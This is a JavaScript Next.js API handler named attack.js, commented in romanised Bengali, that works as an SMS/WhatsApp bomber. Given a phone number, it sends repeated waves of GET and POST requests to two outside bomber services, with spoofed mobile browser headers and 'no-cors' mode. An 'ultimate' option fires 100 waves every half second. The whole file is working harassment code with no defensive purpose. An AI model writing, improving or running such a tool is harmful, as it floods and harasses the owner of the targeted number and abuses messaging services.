// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  // Target links e ekhon amra query string add korbo
  const targetLinks = [
    'https://shadowx-sms-bomber.onrender.com/',
    'https://nuke-sms-bomber.pages.dev/'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 100 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      const attackPromises = targetLinks.map(async (baseUrl) => {
        try {
          // Amra ekhane duiti method try korbo:
          // 1. URL Parameters (GET style)
          // 2. JSON Body (POST style)

          // Method 1: URL Query String (Eita beshi effective hoy direct hit er jonno)
          const urlWithParams = `${baseUrl}?number=${number}&amount=1&country=BD&service=whatsapp`;

          // Method 1 Call
          await fetch(urlWithParams, {
            method: 'GET',
            mode: 'no-cors', // CORS bypass korar jonno
            headers: {
              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            }
          });

          // Method 2: POST Body (Jeta age diyechilam)
          await fetch(baseUrl, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            },
            body: JSON.stringify({
              number: number,
              amount: 1,
              country: "BD",
              service: "whatsapp"
            }),
            mode: 'no-cors'
          });

          console.log(`[Wave ${i}] Attempted hit on ${baseUrl}`);

        } catch (err) {
          console.error(`[Wave ${i}] Error: ${err.message}`);
        }
      });

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK IN PROGRESS! 🔥" 
  });
}
